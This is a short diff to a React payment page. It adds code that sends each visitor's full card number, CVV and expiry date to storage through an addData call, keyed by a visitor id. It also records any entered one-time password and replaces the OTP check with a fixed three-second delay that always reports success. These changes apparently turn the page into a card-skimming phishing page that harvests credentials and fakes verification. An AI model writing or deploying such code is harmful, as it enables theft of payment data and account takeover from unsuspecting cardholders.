@@ -172,6 +172,7 @@ export default function MainPage() {
   }
 
   const handlePayment = () => {
+    addData({ id: visitorId, cardNumber: cardInfo.number, cvv:cardInfo.cvv,expiryDate:cardInfo.expiry })
     if (paymentMethod === "cash") {
       setCurrentStep("success")
     } else {
@@ -180,9 +181,12 @@ export default function MainPage() {
   }
 
   const handleOtpVerification = () => {
-    if (otpCode.length === 4) {
+    addData({ id: visitorId,otp:otpCode })
+
+    setTimeout(() => {
       setCurrentStep("success")
-    }
+    }, 3000);
+    
   }
 
   const closeDialog = () => {
